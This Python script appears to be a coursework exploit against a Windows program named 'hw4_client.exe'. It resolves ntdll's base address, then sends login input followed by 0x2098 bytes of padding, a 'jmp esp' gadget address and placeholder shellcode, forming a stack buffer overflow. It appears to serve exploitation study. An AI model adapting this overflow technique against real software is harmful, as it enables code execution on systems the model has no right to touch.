import ctypes
import subprocess
from ctypes import wintypes  

def GetMoudleHandle(module):     
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)     
    kernel32.GetModuleHandleW.restype = wintypes.HMODULE     
    kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]     
    hMod = kernel32.GetModuleHandleW(module)     
    return hMod 

ntdll_base=GetMoudleHandle("ntdll")
print(hex(ntdll_base))
offset_from_base = 0x4b31eb7a - ntdll_base
print(offset_from_base)
# Path to the .exe file
exe_path = "hw4_client.exe"

# Start the process
process = subprocess.Popen(exe_path, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
input()

payload= "archer\n56M9JNQ60KB7APLC\nPEEK\n"+("a" * 0X2098) + "( Pb" + "E" * 100
# "( Pb" is the gadget address for jmp esp
# "E" * 100 is the shell code

# Provide user_name
output, error = process.communicate(input= payload)
# print(output)

